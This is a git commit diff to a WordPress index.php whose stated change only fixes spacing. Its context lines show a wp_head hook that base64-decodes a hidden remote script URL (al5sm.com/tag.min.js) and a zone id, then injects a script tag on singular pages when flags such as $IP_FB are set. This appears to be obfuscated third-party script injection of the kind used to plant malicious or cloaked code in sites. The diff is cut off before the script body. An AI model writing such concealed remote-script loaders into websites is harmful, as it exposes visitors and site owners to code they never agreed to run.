37ec27649fd3d66133ae882adf3ba9839b192e94
ahmadfatoni19670 <164468840+ahmadfatoni19670@users.noreply.github.com>
2026-08-21 13:44:44 +0700

    Update index.php

--- index.php
+++ index.php
@@ -31,7 +31,7 @@ add_action('wp_head', function () {
 
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB)) {
 
-        $SR  = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
+        $SR = base64_decode('aHR0cHM6Ly9hbDVzbS5jb20vdGFnLm1pbi5qcw==');
         $ZN = base64_decode('MTE2MDk2MjA=');
         ?>
         <script>
